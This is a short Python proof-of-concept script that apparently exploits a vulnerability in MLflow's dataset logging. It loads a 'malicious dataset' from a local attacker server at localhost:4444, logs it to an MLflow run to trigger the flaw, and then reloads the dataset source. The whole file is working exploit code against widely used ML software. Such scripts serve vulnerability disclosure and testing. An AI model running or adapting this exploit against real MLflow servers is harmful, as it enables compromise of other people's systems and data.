import mlflow.data
import pandas as pd
from mlflow.data.pandas_dataset import PandasDataset
# Load malicious dataset
df = pd.read_csv('http://localhost:4444')
dataset = mlflow.data.from_pandas(df, source='http://localhost:4444')
# Perform logging to trigger the vulnerability
with mlflow.start_run():
    mlflow.log_input(dataset, context='training')
# Retrieve and load the dataset source
run = mlflow.get_run(mlflow.last_active_run().info.run_id)
dataset_info = run.inputs.dataset_inputs[0].dataset
dataset_source = mlflow.data.get_source(dataset_info)
dataset_source.load()
